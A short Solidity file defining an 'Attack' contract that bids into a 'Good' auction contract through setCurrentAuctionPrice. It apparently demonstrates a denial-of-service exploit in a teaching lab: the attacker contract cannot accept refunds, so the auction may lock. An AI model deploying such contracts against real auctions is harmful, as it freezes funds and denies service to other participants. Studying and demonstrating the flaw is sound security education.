// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import "./Lock.sol";

contract Attack {
    Good good;

    constructor(address _good) {
        good = Good(_good);
    }

    function attack() public payable {
        good.setCurrentAuctionPrice{value: msg.value}();
    }
}
